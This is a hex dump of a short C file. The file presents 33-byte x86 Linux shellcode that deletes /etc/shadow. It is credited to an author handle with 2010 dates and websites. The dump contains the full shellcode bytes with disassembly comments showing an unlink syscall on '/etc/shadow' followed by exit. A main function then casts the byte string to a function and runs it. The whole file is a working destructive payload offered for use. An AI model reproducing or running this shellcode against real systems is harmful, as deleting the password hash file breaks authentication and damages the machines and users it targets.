00000000  2f 2a 0d 0a 4e 61 6d 65  20 20 20 3a 20 33 33 20  |/*..Name   : 33 |
00000010  62 79 74 65 73 20 75 6e  6c 69 6e 6b 20 22 2f 65  |bytes unlink "/e|
00000020  74 63 2f 73 68 61 64 6f  77 22 20 78 38 36 20 6c  |tc/shadow" x86 l|
00000030  69 6e 75 78 20 73 68 65  6c 6c 63 6f 64 65 0d 0a  |inux shellcode..|
00000040  44 61 74 65 20 20 20 3a  20 57 65 64 20 4a 75 6e  |Date   : Wed Jun|
00000050  20 20 32 20 31 38 3a 30  31 3a 34 34 20 32 30 31  |  2 18:01:44 201|
00000060  30 0d 0a 41 75 74 68 6f  72 20 3a 20 67 75 6e 73  |0..Author : guns|
00000070  6c 69 6e 67 65 72 5f 20  3c 79 75 64 68 61 2e 67  |linger_ <yudha.g|
00000080  75 6e 73 6c 69 6e 67 65  72 5b 61 74 5d 67 6d 61  |unslinger[at]gma|
00000090  69 6c 2e 63 6f 6d 3e 0d  0a 57 65 62 20 20 20 20  |il.com>..Web    |
000000a0  3a 20 68 74 74 70 3a 2f  2f 64 65 76 69 6c 7a 63  |: http://devilzc|
000000b0  30 64 65 2e 6f 72 67 0d  0a 62 6c 6f 67 20 20 20  |0de.org..blog   |
000000c0  3a 20 68 74 74 70 3a 2f  2f 67 75 6e 73 6c 69 6e  |: http://gunslin|
000000d0  67 65 72 63 30 64 65 2e  77 6f 72 64 70 72 65 73  |gerc0de.wordpres|
000000e0  73 2e 63 6f 6d 0d 0a 74  65 73 74 65 64 20 6f 6e  |s.com..tested on|
000000f0  20 3a 20 6c 69 6e 75 78  20 64 65 62 69 61 6e 0d  | : linux debian.|
00000100  0a 2a 2f 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |.*/..#include <s|
00000110  74 64 69 6f 2e 68 3e 0d  0a 0d 0a 63 68 61 72 20  |tdio.h>....char |
00000120  2a 73 68 65 6c 6c 63 6f  64 65 3d 0d 0a 09 09 22  |*shellcode=...."|
00000130  5c 78 65 62 5c 78 30 66  22 20 20 20 20 20 20 20  |\xeb\x0f"       |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
00000150  6a 6d 70 20 20 20 20 30  78 38 30 34 38 30 37 31  |jmp    0x8048071|
00000160  20 2a 2f 0d 0a 09 09 22  5c 78 33 31 5c 78 63 30  | */...."\x31\xc0|
00000170  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000180  20 20 20 20 20 2f 2a 20  78 6f 72 20 20 20 20 25  |     /* xor    %|
00000190  65 61 78 2c 25 65 61 78  20 2a 2f 0d 0a 09 09 22  |eax,%eax */...."|
000001a0  5c 78 62 30 5c 78 30 61  22 20 20 20 20 20 20 20  |\xb0\x0a"       |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
000001c0  6d 6f 76 20 20 20 20 24  30 78 61 2c 25 61 6c 20  |mov    $0xa,%al |
000001d0  2a 2f 0d 0a 09 09 22 5c  78 35 62 22 20 20 20 20  |*/...."\x5b"    |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001f0  20 20 20 20 2f 2a 20 70  6f 70 20 20 20 20 25 65  |    /* pop    %e|
00000200  62 78 20 2a 2f 0d 0a 09  09 22 5c 78 63 64 5c 78  |bx */...."\xcd\x|
00000210  38 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |80"             |
00000220  20 20 20 20 20 20 20 2f  2a 20 69 6e 74 20 20 20  |       /* int   |
00000230  20 24 30 78 38 30 20 2a  2f 0d 0a 09 09 22 5c 78  | $0x80 */...."\x|
00000240  33 31 5c 78 63 30 22 20  20 20 20 20 20 20 20 20  |31\xc0"         |
00000250  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 78 6f  |           /* xo|
00000260  72 20 20 20 20 25 65 61  78 2c 25 65 61 78 20 2a  |r    %eax,%eax *|
00000270  2f 0d 0a 09 09 22 5c 78  62 30 5c 78 30 31 22 20  |/...."\xb0\x01" |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000290  20 20 20 2f 2a 20 6d 6f  76 20 20 20 20 24 30 78  |   /* mov    $0x|
000002a0  31 2c 25 61 6c 20 2a 2f  0d 0a 09 09 22 5c 78 33  |1,%al */...."\x3|
000002b0  31 5c 78 64 62 22 20 20  20 20 20 20 20 20 20 20  |1\xdb"          |
000002c0  20 20 20 20 20 20 20 20  20 20 2f 2a 20 78 6f 72  |          /* xor|
000002d0  20 20 20 20 25 65 62 78  2c 25 65 62 78 20 2a 2f  |    %ebx,%ebx */|
000002e0  0d 0a 09 09 22 5c 78 63  64 5c 78 38 30 22 20 20  |...."\xcd\x80"  |
000002f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000300  20 20 2f 2a 20 69 6e 74  20 20 20 20 24 30 78 38  |  /* int    $0x8|
00000310  30 20 2a 2f 0d 0a 09 09  22 5c 78 65 38 5c 78 65  |0 */...."\xe8\xe|
00000320  63 5c 78 66 66 5c 78 66  66 5c 78 66 66 22 20 20  |c\xff\xff\xff"  |
00000330  20 20 20 20 20 20 2f 2a  20 63 61 6c 6c 20 20 20  |      /* call   |
00000340  30 78 38 30 34 38 30 36  32 20 2a 2f 0d 0a 09 09  |0x8048062 */....|
00000350  22 5c 78 32 66 22 20 20  20 20 20 20 20 20 20 20  |"\x2f"          |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000370  20 64 61 73 20 20 20 20  20 2a 2f 0d 0a 09 09 22  | das     */...."|
00000380  5c 78 36 35 22 20 20 20  20 20 20 20 20 20 20 20  |\x65"           |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
000003a0  67 73 20 2a 2f 0d 0a 09  09 22 5c 78 37 34 5c 78  |gs */...."\x74\x|
000003b0  36 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |63"             |
000003c0  20 20 20 20 20 20 20 2f  2a 20 6a 65 20 20 20 20  |       /* je    |
000003d0  20 30 78 38 30 34 38 30  64 64 20 2a 2f 0d 0a 09  | 0x80480dd */...|
000003e0  09 22 5c 78 32 66 22 20  20 20 20 20 20 20 20 20  |."\x2f"         |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000400  2a 20 64 61 73 20 20 20  20 20 2a 2f 0d 0a 09 09  |* das     */....|
00000410  22 5c 78 37 33 5c 78 36  38 22 20 20 20 20 20 20  |"\x73\x68"      |
00000420  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000430  20 6a 61 65 20 20 20 20  30 78 38 30 34 38 30 65  | jae    0x80480e|
00000440  35 20 2a 2f 0d 0a 09 09  22 5c 78 36 31 22 20 20  |5 */...."\x61"  |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000460  20 20 20 20 20 20 2f 2a  20 70 6f 70 61 20 20 20  |      /* popa   |
00000470  20 2a 2f 0d 0a 09 09 22  5c 78 36 34 5c 78 36 66  | */...."\x64\x6f|
00000480  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000490  20 20 20 20 20 2f 2a 20  6f 75 74 73 6c 20 20 25  |     /* outsl  %|
000004a0  66 73 09 09 22 28 25 65  73 69 29 2c 28 25 64 78  |fs.."(%esi),(%dx|
000004b0  29 20 2a 2f 0d 0a 09 09  22 5c 78 37 37 22 3b 20  |) */...."\x77"; |
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004d0  20 20 20 20 20 20 20 2f  2a 20 2e 62 79 74 65 20  |       /* .byte |
000004e0  30 78 37 37 20 2a 2f 0d  0a 0d 0a 69 6e 74 20 6d  |0x77 */....int m|
000004f0  61 69 6e 28 76 6f 69 64  29 0d 0a 7b 0d 0a 09 09  |ain(void)..{....|
00000500  66 70 72 69 6e 74 66 28  73 74 64 6f 75 74 2c 22  |fprintf(stdout,"|
00000510  4c 65 6e 67 74 68 3a 20  25 64 5c 6e 22 2c 73 74  |Length: %d\n",st|
00000520  72 6c 65 6e 28 73 68 65  6c 6c 63 6f 64 65 29 29  |rlen(shellcode))|
00000530  3b 0d 0a 09 09 28 28 76  6f 69 64 20 28 2a 29 28  |;....((void (*)(|
00000540  76 6f 69 64 29 29 20 73  68 65 6c 6c 63 6f 64 65  |void)) shellcode|
00000550  29 28 29 3b 0d 0a 09 09  72 65 74 75 72 6e 20 30  |)();....return 0|
00000560  3b 0d 0a 7d                                       |;..}|
00000564
